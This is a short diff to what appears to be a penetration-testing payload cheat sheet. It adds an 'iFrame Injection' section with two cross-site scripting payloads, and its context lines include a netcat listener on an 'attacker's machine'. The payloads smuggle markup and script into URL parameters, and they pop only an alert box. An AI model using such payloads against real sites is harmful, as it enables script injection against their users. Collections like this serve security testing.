@@ -43,6 +43,12 @@ Attacker's machine:
 nc -l 80
 ```
 
+### iFrame Injection
+```
+ParamUrl=robots.txt" onload="alert(1)
+ParamHeight="></iframe><script>alert(1);</script>
+```
+
 ### PHP Code Injection
 
 ```
